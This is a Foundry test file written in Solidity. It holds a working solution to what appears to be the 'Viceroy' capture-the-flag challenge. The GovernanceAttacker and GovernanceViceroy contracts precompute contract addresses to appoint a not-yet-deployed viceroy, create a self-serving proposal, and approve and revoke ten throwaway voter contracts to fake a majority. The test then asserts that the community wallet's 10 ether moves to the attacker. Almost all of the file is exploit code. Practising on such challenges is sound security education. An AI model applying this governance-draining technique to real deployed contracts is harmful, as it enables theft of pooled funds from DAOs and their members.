// SPDX-License-Identifier: MIT

import {Test, console} from "forge-std/Test.sol";
import {OligarchyNFT, Governance, CommunityWallet} from "../src/Viceroy.sol";

pragma solidity ^0.8.0;

contract ViceroyTest is Test {
    GovernanceAttacker governanceAttacker;
    Governance governance;
    OligarchyNFT oligarchyNFT;
    CommunityWallet communityWallet;

    address public victim = makeAddr("victim");
    address public attacker = makeAddr("attacker");

    function setUp() public {
        vm.deal(victim, 10 ether);

        vm.prank(attacker);
        governanceAttacker = new GovernanceAttacker();

        vm.startPrank(victim);
        oligarchyNFT = new OligarchyNFT(address(governanceAttacker));
        governance = new Governance{value: 10 ether}(oligarchyNFT);
        communityWallet = CommunityWallet(governance.communityWallet());
        vm.stopPrank();

        assertEq(address(communityWallet).balance, 10 ether);
    }

    function testViceroy() public {
        uint256 attackerBalanceBefore = attacker.balance;
        uint256 currentNonce = vm.getNonce(attacker);

        // for some reason, the victim calls the function instead of the attacker
        vm.prank(victim);
        governanceAttacker.attack(governance);

        assertEq(address(communityWallet).balance, 0);
        assertEq(attacker.balance, attackerBalanceBefore + 10 ether);
        assert(vm.getNonce(attacker) < currentNonce + 2);
    }
}

contract GovernanceAttacker {
    GovernanceViceroy governanceViceroy;
    CommunityWallet communityWallet;

    address public owner;

    constructor() {
        owner = msg.sender;
    }

    function attack(Governance governance) public {
        // predicted address of governanceViceroy
        address predictedAddress = address(
            uint160(uint256(keccak256(abi.encodePacked(bytes1(0xd6), bytes1(0x94), address(this), bytes1(0x01)))))
        );
        communityWallet = CommunityWallet(governance.communityWallet());

        governance.appointViceroy(predictedAddress, 1);

        new GovernanceViceroy(governance, owner);
    }
}

contract GovernanceViceroy {
    constructor(Governance governance, address attacker) {
        address communityWallet = address(governance.communityWallet());
        bytes memory data =
            abi.encodeWithSignature("exec(address,bytes,uint256)", attacker, "", communityWallet.balance);
        uint256 proposalId = uint256(keccak256(data));
        governance.createProposal(address(this), data);

        for (uint8 i = 1; i < 11; i++) {
            address predictedAddress = address(
                uint160(uint256(keccak256(abi.encodePacked(bytes1(0xd6), bytes1(0x94), address(this), bytes1(i)))))
            );
            governance.approveVoter(predictedAddress);
            new GovernanceVoter(governance, proposalId);
            governance.disapproveVoter(predictedAddress);
        }
        governance.executeProposal(proposalId);
    }
}

contract GovernanceVoter {
    constructor(Governance governance, uint256 proposalId) {
        governance.voteOnProposal(proposalId, true, msg.sender);
    }
}
